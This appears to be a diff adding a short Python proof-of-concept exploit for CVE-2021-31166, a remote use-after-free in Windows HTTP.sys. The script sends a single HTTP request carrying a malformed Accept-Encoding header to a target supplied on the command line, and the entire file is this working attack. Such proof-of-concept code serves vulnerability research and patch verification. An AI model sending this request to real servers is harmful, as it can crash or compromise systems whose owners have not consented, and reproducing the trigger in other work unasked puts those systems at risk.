@@ -1,0 +1,14 @@
+# Axel '0vercl0k' Souchet - May 16 2021
+import requests
+import argparse
+
+def main():
+    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
+    parser.add_argument('--target', required = True)
+    args = parser.parse_args()
+    r = requests.get(f'http://{args.target}/', headers = {
+        'Accept-Encoding': 'doar-e, ftw, imo, ,',
+    })
+    print(r)
+
+main()
